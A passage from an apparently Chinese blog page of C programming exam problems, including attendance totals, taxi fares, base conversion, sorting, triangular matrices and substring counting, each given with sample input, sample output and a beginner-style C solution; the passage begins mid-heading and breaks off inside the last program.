title="考勤系统"></a>考勤系统</h3><p>问题描述<br>实验室使用考勤系统对学生进行考勤。考勤系统会记录下每个学生一天内每次进出实验室的时间。<br>每位学生有一个唯一编号，每条考勤记录包括学生的编号，进入时间、离开时间。<br>给出所有学生一天的考勤记录，请统计每个学生在实验室工作的时间，并按照工作时间从长到短给出一天的统计表，工作时间相同时按编号从小到大排序。</p><p>输入说明<br>输入的第一行包含一个整数n，表示考勤记录条数。1≤n≤100，学生的编号为不超过100的正整数。<br>接下来是n行，每行是一条考勤记录，每条记录包括学生编号k，进入时间t1和离开时间t2三项。<br>t1和t2格式为“hh:mm”，即两位数表示的小时和两位数表示的分钟。例如14:20表示下午两点二十分，所有时间均为24小时制，且均为同一天内的时间。</p><p>输出说明<br>输出按工作时间和学生编号排序的统计表。统计表包含若干行，每行为一个学生的出勤记录，由学生编号和总工作时间构成，总工作时间以分钟为单位。</p><p>输入样例    </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">08</span>:<span class="number">00</span> <span class="number">11</span>:<span class="number">50</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">09</span>:<span class="number">00</span> <span class="number">12</span>:<span class="number">00</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">13</span>:<span class="number">50</span> <span class="number">17</span>:<span class="number">30</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">14</span>:<span class="number">00</span> <span class="number">18</span>:<span class="number">00</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">17</span>:<span class="number">00</span> <span class="number">24</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure><p>输出样例    </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">3 </span><span class="number">450</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">420</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">420</span></span><br></pre></td></tr></table></figure><p>输入样例2</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span></span><br><span class="line"><span class="symbol">16 </span><span class="number">00</span>:<span class="number">40</span> <span class="number">15</span>:<span class="number">20</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">21</span>:<span class="number">30</span> <span class="number">22</span>:<span class="number">50</span></span><br><span class="line"><span class="symbol">42 </span><span class="number">01</span>:<span class="number">50</span> <span class="number">02</span>:<span class="number">30</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">13</span>:<span class="number">50</span> <span class="number">16</span>:<span class="number">20</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">17</span>:<span class="number">30</span> <span class="number">20</span>:<span class="number">30</span></span><br><span class="line"><span class="symbol">25 </span><span class="number">01</span>:<span class="number">30</span> <span class="number">10</span>:<span class="number">30</span></span><br><span class="line"><span class="symbol">5 </span><span class="number">01</span>:<span class="number">50</span> <span class="number">17</span>:<span class="number">20</span></span><br></pre></td></tr></table></figure><p>输出样例2</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">5 </span><span class="number">930</span></span><br><span class="line"><span class="symbol">16 </span><span class="number">880</span></span><br><span class="line"><span class="symbol">25 </span><span class="number">540</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">180</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">150</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">80</span></span><br><span class="line"><span class="symbol">42 </span><span class="number">40</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,i,j,x;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">int</span> h1;</span><br><span class="line"><span class="keyword">int</span> m1;</span><br><span class="line"><span class="keyword">int</span> h2;</span><br><span class="line"><span class="keyword">int</span> m2;</span><br><span class="line"><span class="keyword">int</span> sum;</span><br><span class="line">&#125;stu[<span class="number">101</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,temp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">stu[x].num=x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d:%d %d:%d"</span>,&amp;stu[x].h1,&amp;stu[x].m1,&amp;stu[x].h2,&amp;stu[x].m2);</span><br><span class="line">stu[x].sum+=(stu[x].h2-stu[x].h1)*<span class="number">60</span>+(stu[x].m2-stu[x].m1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">101</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">101</span>-i;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(stu[j].sum&lt;stu[j+<span class="number">1</span>].sum)</span><br><span class="line">&#123;</span><br><span class="line">temp=stu[j];</span><br><span class="line">stu[j]=stu[j+<span class="number">1</span>];</span><br><span class="line">stu[j+<span class="number">1</span>]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">101</span>,stu[i].num!=<span class="number">0</span>;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>,stu[i].num,stu[i].sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="c真题"><a href="#c真题" class="headerlink" title="c真题"></a>c真题</h2><h3 id="出租车费"><a href="#出租车费" class="headerlink" title="出租车费"></a>出租车费</h3><p><strong>问题描述</strong></p><p>某市出租车起步价3公里9.00元（含3公里），基本公里运价2.00元/公里，单程载客12公里以上时，超出12公里每公里加收公里运价50%的空驶补贴费；夜间计费23时至次日6时（含23时和6时），起步价增加1元，每公里运价加收0.3元。<br>例如：（1）乘车时间9点，里程2.5公里，应付车资=起步价，即：fee=9;<br>（2）乘车时间14点，里程15.6公里，应付车资=起步价+12公里内车费+超出12公里车费，即：<br>fee =9+(12-3)<em>2 +(15.6-12)*2</em>(1+0.5);<br>（3）乘车时间2点，里程11.3公里，应付车资=起步价+12公里内车费，即：fee=(9+1)+(11.3-3)*(2+0.3);<br>从键盘输入乘车时间与乘车的公里数，输出应付的车费。 </p><p><strong>输入说明</strong></p><p>输入一个整数对应乘车时间<code>（24小时制，0~23）</code>，一个实数对应乘车公里数，两个数之间用空格分隔。</p><p><strong>输出说明</strong></p><p>输出应付的车费，小数点后保留1位小数。</p><p><strong>输入样例</strong></p><p><code>2 23.1</code></p><p><strong>输出样例</strong></p><p><code>69.0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> time,start;</span><br><span class="line"><span class="keyword">float</span> dis,per,per1,fee;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %f"</span>, &amp;time, &amp;dis);</span><br><span class="line"><span class="keyword">if</span> (time &gt; <span class="number">6</span> &amp;&amp; time &lt; <span class="number">23</span>)</span><br><span class="line">&#123;</span><br><span class="line">per = <span class="number">2</span>;</span><br><span class="line">start = <span class="number">9</span>;</span><br><span class="line">per1 = per * <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">per = <span class="number">2.3</span>;</span><br><span class="line">start = <span class="number">10</span>;</span><br><span class="line">per1 = per * <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dis &lt;= <span class="number">3</span>)</span><br><span class="line">fee = start;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (dis &lt;= <span class="number">12</span>)</span><br><span class="line">fee = start + (dis - <span class="number">3</span>) * per;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">fee = start + (<span class="number">12</span> - <span class="number">3</span>) * per + (dis - <span class="number">12</span>) * per1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.1f"</span>, fee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="公式求值"><a href="#公式求值" class="headerlink" title="公式求值"></a>公式求值</h3><p>问题描述</p><p>已知公式Sn=a+aa+aaa+…+aa…a(n个a)，其中a是一个数字（1≤a≤9），n表示a的位数（1≤n≤9），给出两个整数a和n，计算Sn，例如：a=2, n=5时Sn=2+22+222+2222+22222。</p><p><strong>输入说明</strong></p><p>在一行上输入两个整数a和n的值，并以空格相隔，1≤a≤9，1≤n≤9。</p><p><strong>输出说明</strong></p><p>输出Sn的计算结果。</p><p><strong>输入样例</strong></p><p><code>2 5</code></p><p><strong>输出样例</strong></p><p><code>24690</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, n, i,sn=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">number</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> i)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;a, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">sn += number(a, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, sn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">number</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x, num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (x = <span class="number">0</span>; x &lt;= i; x++)</span><br><span class="line">num = num * <span class="number">10</span> + a;</span><br><span class="line"><span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><p><strong>问题描述</strong></p><p>将十进制数转为其他进制数输出。</p><p><strong>输入说明</strong></p><p>输入两个整数，分别表示十进制下的数字a(0≤a≤(2^31)-1)和进制N(2≤N≤9)，整数之间使用空格分隔。</p><p><strong>输出说明</strong></p><p>输出十进制数字a的N进制表示。</p><p><strong>输入样例</strong></p><p><code>17 7</code></p><p><strong>输出样例</strong></p><p><code>23</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, n,<span class="built_in">end</span>=<span class="number">0</span>,temp;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;a, &amp;n);</span><br><span class="line"><span class="keyword">while</span> (a != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp = a % n;</span><br><span class="line"><span class="built_in">end</span> = <span class="built_in">end</span> * <span class="number">10</span> + temp;</span><br><span class="line">a /= n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, <span class="built_in">end</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="部分排序"><a href="#部分排序" class="headerlink" title="部分排序"></a>部分排序</h3><p><strong>问题描述</strong></p><p>给出n个整数，按指定顺序k进行排序，然后输出排序后的前m个整数。</p><p><strong>输入说明</strong></p><p>输入的第一行有三个整数n、k和m（1 ≤ n ≤ 100，0≤ k ≤ 1，1 ≤ m ≤100）</p><p>n表示正整数个数，k表示排序顺序（0表示从小到大排序，1表示从大到小排序），m表示要输出的整数个数，n、k和m之间用空格分隔。 </p><p>输入的第二行有n个整数s1, s2, …, sn (-1000 ≤ si ≤ 10000, 1 ≤ i ≤ n)。相邻的整数用空格分隔。 </p><p><strong>输出说明</strong></p><p>在一行上输出按指定顺序排序后的前m个整数，整数之间用空格分隔。如果m&gt;n，只输出n个整数。</p><p><strong>输入样例</strong></p><p>输入样例1 </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span><span class="number">1</span> <span class="number">3</span> </span><br><span class="line"><span class="symbol">10 </span><span class="number">1</span> <span class="number">10</span> <span class="number">20</span> <span class="number">30</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><p>输入样例2 </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">5 </span><span class="number">0</span> <span class="number">3</span> </span><br><span class="line"><span class="symbol">10 </span><span class="number">1</span> <span class="number">8</span> <span class="number">12</span> <span class="number">7</span></span><br></pre></td></tr></table></figure><p><strong>输出样例</strong></p><p>输出样例1<br><code>30 20 20</code><br>输出样例2<br><code>1 7 8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, k, m, i,num[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort0</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort1</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>, &amp;n, &amp;k, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i]);</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">0</span>)</span><br><span class="line">sort0(num, n);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">sort1(num, n);</span><br><span class="line"><span class="keyword">if</span> (m &gt; n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort0</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, t;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num[j] &gt; num[j + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">t = num[j];</span><br><span class="line">num[j] = num[j + <span class="number">1</span>];</span><br><span class="line">num[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort1</span><span class="params">(<span class="keyword">int</span>* num, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, t;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num[j] &lt; num[j + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">t = num[j];</span><br><span class="line">num[j] = num[j + <span class="number">1</span>];</span><br><span class="line">num[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="上三角矩阵"><a href="#上三角矩阵" class="headerlink" title="上三角矩阵"></a>上三角矩阵</h3><p><strong>问题描述</strong></p><p>主对角线（图中红色虚线）以下都是零的方阵称为上三角矩阵，如下图（a）是上三角矩阵，（b）不是上三角矩阵。给出一个n行n列的方阵，判断是不是上三角矩阵，如果是则求出上三角元素和，如果不是则统计下三角非零元素个数。</p><img src="007UR4Zcly1gaahh188b3j305k03et8h.jpg" alt="图片1.png" style="zoom:150%;" /> <p><strong>输入说明</strong></p><p>输入第一行为一个整数n<code>（1&lt;n&lt;50）</code>表示方阵行数和列数；接下来是n行，每行n个整数，表示方阵的各个元素。</p><p><strong>输出说明</strong></p><p>如果方阵是上三角矩阵，则输出上三角的元素和（不含主对角线上的元素），如果方阵不是上三角矩阵，则输出下三角中非零元素个数（不含主对角线上的元素）。</p><p><strong>输入样例</strong></p><p>输入样例1： </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">3 </span></span><br><span class="line"><span class="symbol">3 </span><span class="number">5</span> <span class="number">5</span> </span><br><span class="line"><span class="symbol">0 </span><span class="number">2</span> <span class="number">1</span> </span><br><span class="line"><span class="symbol">0 </span><span class="number">0</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><p>输入样例2 </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">3 </span></span><br><span class="line"><span class="symbol">3 </span><span class="number">2</span> <span class="number">6</span> </span><br><span class="line"><span class="symbol">1 </span><span class="number">0</span> <span class="number">4</span> </span><br><span class="line"><span class="symbol">0 </span><span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>输出样例</strong></p><p>输出样例1<br><code>11</code><br>输出样例2<br><code>2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, i, j, num[<span class="number">50</span>][<span class="number">50</span>], flag = <span class="number">1</span>, count = <span class="number">0</span>, sum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num[i][j] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n; j++)</span><br><span class="line">sum += num[i][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="子串统计"><a href="#子串统计" class="headerlink" title="子串统计"></a>子串统计</h3><p><strong>问题描述</strong></p><p>输入两个字符串，分别称为母串和子串。统计子串在母串中出现的次数和位置。注意子串可以重叠，见输入样例2。</p><p><strong>输入说明</strong></p><p>输入分为两行，第一行为母串，第二行为子串。母串和子串的长度都不超过100。</p><p><strong>输出说明</strong></p><p>输出子串在母串中出现的次数，并按出现次序输出每次子串在母串中出现时，子串第一个字符在母串中的位置（位置从0开始计算）。</p><p><strong>输入样例</strong></p><p>输入样例1： </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">12312431235412 </span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure><p>输入样例2：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">12121212 </span></span><br><span class="line"><span class="number">1212</span></span><br></pre></td></tr></table></figure><p><strong>输出样例</strong></p><p>输出样例1：<br><code>2 0 7</code></p><p>输出样例2：<br><code>3 0 2 4</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>], sub[<span class="number">100</span>],*p;</span><br><span class="line"><span class="keyword">int</span> count[<span class="number">10</span>],k=<span class="number">0</span>,i;</span><br><span class="line">gets_s(s, <span class="number">100</span>);</span><br><span class="line">gets_s(sub, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">strstr</span>(s, sub);</span><br><span class="line"><span class="keyword">while</span> (p)</span><br><span class="line">&#123;</span><br><span class="line">count[k++] = p - s;</span><br><span class="line">*p = <span class="string">'*'</span>;</span><br><span class="line">p = <span class="built_in">strstr</span>(s, sub);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, k);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line"><span 